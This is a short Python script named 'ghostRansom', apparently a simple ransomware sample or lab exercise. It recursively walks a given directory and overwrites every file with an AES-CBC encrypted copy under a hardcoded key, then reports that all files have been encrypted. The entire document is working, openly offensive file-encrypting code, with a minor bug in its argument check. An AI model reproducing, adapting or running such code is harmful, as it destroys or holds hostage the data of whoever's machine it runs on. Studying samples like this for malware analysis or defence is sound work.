import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

path = sys.argv[1]

print("Welcome to ghostRansom...")

if len(sys.argv) < 2:
  print(f"{sys.argv[0]} <file>")
  sys.exit()

print(f"Starting encrypting {sys.argv[1]}")

hex_key = "61626b656c646c7768736b646c663b64"
key = bytes.fromhex(hex_key)

for root, dirs, files in os.walk(path):
  for file in files:
    file = os.path.join(root, file)
    data = open(file, "rb").read()

    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.iv+cipher.encrypt(pad(data, AES.block_size))

    open(file, "wb").write(ciphertext)

print("All the files have been encrypted")

